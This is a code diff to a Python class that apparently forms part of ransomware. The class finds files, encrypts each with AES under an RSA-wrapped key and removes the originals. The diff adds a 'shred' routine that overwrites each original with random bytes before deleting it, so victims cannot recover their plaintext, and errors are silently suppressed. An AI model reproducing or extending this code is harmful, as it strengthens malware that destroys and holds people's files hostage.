@@ -4,10 +4,12 @@
 
 import os
 import time
+import secrets
 import lib.const as const
 from lib.file import File
 from threading import Thread, RLock
 from lib.file_finder import FileFinder
+from Crypto.Random import get_random_bytes
 from lib.crypto import CryptoRSA, CryptoAES
 
 
@@ -19,6 +21,17 @@ class Encryptor:
         self.file_finder = FileFinder()
         self.active_threads_lock = RLock()
         self.RSA_public_key = RSA_public_key
+
+    def shred(self, file):
+        max_num = (64 << 10)
+        secret_num = secrets.randbelow(max_num)
+
+        try:
+            with open(file, 'wb') as f:
+                f.write(get_random_bytes(secret_num))
+            os.remove(file)
+        except:
+            pass
 
     def _encrypt_file(self, file, AES_key):
 
@@ -38,8 +51,8 @@ class Encryptor:
                         f.write(encrypted_AES_key)
                     f.write(CryptoAES.encrypt(data, AES_key))
 
-            # delete original file
-            os.remove(file)
+            # shed the original file
+            self.shred(file)
         except:
             pass
         finally:
